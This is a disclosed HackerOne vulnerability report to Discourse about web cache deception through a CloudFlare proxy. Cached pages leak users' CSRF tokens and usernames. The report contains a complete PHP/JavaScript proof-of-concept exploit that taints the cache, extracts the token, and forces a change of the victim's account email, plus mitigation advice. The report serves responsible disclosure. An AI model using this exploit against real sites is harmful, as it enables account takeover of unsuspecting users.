# CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)

## Report Details
- **Report ID**: 260697
- **URL**: https://hackerone.com/reports/260697
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-08-16T13:06:55.522Z
- **Disclosed**: 2018-08-08T18:00:12.220Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: discourse

## Vulnerability Information
Hi,

I noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting `try.discourse.org` but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.

The TL;DR of issue is basically: `Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens`.

As you might understand due to this, the PoC below is not working on `try.discourse.org`. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.

### Background

You might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. 

Any URL having a file ending with one of [CloudFlare's mime types](https://support.cloudflare.com/hc/en-us/articles/200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-) will be cached for the whole region. Remember, a region is **big** and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from [CloudFlare about their regions](https://support.cloudflare.com/hc/en-us/articles/115000540888-Load-Balancing-Geographic-Regions).

This attack vector was coined by **Omer Gil** earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).

### Technical details

The issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status `200` but also to status `404`.

Here are some routes which will return status `200` on `try.discourse.org` even if we have appended `.css` on them (which is a trigger for CloudFlare to cache this URL):

```
/u/my/preferences.css
/u/my/preferences/username.css
/u/my/preferences/card-badge.css
```
Results in:

```
HTTP/1.1 200 OK
X-Discourse-Route: users/preferences

HTTP/1.1 200 OK
X-Discourse-Route: users/preferences

HTTP/1.1 200 OK
X-Discourse-Route: users/card_badge
```
(This seems to be a general issue with the `X-Discourse-Route: users/*` routes)

Also, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):

```
GET /u/x.css HTTP/1.1
Host: try.discourse.org

<meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />
```

You currently don't have `try.discourse.org` behind CloudFlare, but I've verified with a few instances that I noticed did.

What you will see is the following:

Issuing the following request twice while being signed in:

```
GET /u/x.css HTTP/1.1
```

Will lead to:
```
CF-Cache-Status: HIT
```

As well as:

```
X-Discourse-Username: test

<meta name="csrf-token" content="6bE...VnlQ==" />
```

Same thing with `/u/my/preferences.css`.

The issue is that none of these routes, exposing the CSRF-token and the username, has any `Pragma`, `Cache-Control` or `Expire`-headers, so there's nothing that tells CloudFlare not to cache these URLs.

### PoC

You need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:

{F213373}

Now, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.

What this script will do is this:

1. Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy
2. Victim vists a malicious page by the attacker
3. The page will issue three requests using `img`-tags to `/u/$rand.css`, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token
4. After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).
5. The script will extract the username from the `X-Discourse-Username` header and the CSRF-token from the HTML
6. The PHP-script will return these two values to the malicious site, and a form will be crafted:
```
POST /users/$username/preferences/email.json HTTP/1.1
 
_method=PUT&email=$attacker_email&authenticity_token=$csrf_token
```
   
7. Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.

Here's the script. It seems like `_forum_session`-token has `SameSite=lax` which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.

```php
<?
$discourse = "https://discourse.instance.behind.cloudflare.proxy"; //like https://try.discourse.org but behind CloudFlare
$email_to_change_to = "changetothis@example.com";

if(!empty($_GET['fetch'])) {
	$f = @intval($_GET['f']);
	$ctx = stream_context_create(array('http' => array('ignore_errors' => true)));
	$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);
	preg_match('/name="csrf-token" content="([a-zA-Z0-9\/=+]+)"/', $data, $matches);
	if(!empty($matches[1])) {
		preg_match('/X-Discourse-Username: (.*)/', implode("\n", $http_response_header), $name_matches);
		echo $matches[1].';'.$name_matches[1];
	} else {
		echo 'error';
	}
	exit;
}
#random file to taint with csrf-token
$rand = mt_rand(100000,999999);
?>
<html>
  <body>
	<img src="<?=$discourse?>/u/<?=$rand?>.css" />
	<img src="<?=$discourse?>/u/<?=$rand?>.css" />
	<img src="<?=$discourse?>/u/<?=$rand?>.css" onerror="f()" />
<script>
var user = '', change_email_to = '<?=$email_to_change_to?>';
function f() {
	fetch('?fetch=1&f=<?=$rand?>').then(function(e){return e.text()}).then(function(e){
		if(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }
		user = e.split(';')[1];
		document.getElementById('f').action = '<?=$discourse?>/users/'+user+'/preferences/email'
		submitRequest(e.split(';')[0])
	})
}
function submitRequest(csrf) {
  var xhr = new XMLHttpRequest();
  xhr.onerror = function () {
    console.log(xhr.readyState)
	if(xhr.readyState == 4) {
		alert('Account email for ' + user + ' has been changed to: ' + change_email_to);
	}
  };
  xhr.open("POST", "<?=$discourse?>/users/"+user+"/preferences/email.json", true);
  xhr.setRequestHeader("Accept", "text\/html");
  xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
  xhr.withCredentials = true;
  var body = "_method=PUT&email=" + encodeURIComponent(change_email_to) +"&authenticity_token=" + encodeURIComponent(csrf);
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
}
</script>
    <form action="" id="f" method="POST">
      <input type="hidden" name="&#95;method" value="PUT" />
      <input type="hidden" name="email" value="<?=$email_to_change_to?>" />
      <input type="hidden" name="authenticity&#95;token" id="csrf" value="" />
      <input type="submit" style="display: none;" value="Submit request" />
	  Please wait...
    </form>
  </body>
</html>
```

If you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:

{F213374}

### Mitigations

Add the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the `X-Discourse-Username` is returned.

Let me know if you need any additional information.

Regards,
Frans

## Attachments
- Screen_Shot_2017-08-16_at_14.07.00.png
- Screen_Shot_2017-08-16_at_14.56.30.png
